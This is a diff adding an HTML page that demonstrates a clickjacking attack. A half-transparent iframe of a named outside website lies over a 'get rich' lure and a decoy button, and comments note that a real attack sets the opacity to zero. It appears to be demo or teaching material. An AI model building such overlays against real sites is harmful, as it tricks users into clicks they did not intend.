@@ -1,0 +1,16 @@
+<style>
+    iframe { /* iframe from the victim site */
+      width: 1500px;
+      height: 1000px;
+      position: absolute;
+      top:0; left:-20px;
+      opacity: 0.5; /* in real opacity:0 */
+      z-index: 1;
+    }
+    </style>
+    
+    <div>Click to get rich now:</div>
+    <button>Click here!</button>
+    <input type="button" onclick="alert('Like pressed on facebook.html!')" value="I LIKE IT !">
+    <!-- The url from the victim site -->
+    <iframe src="https://techieegy.com"></iframe>
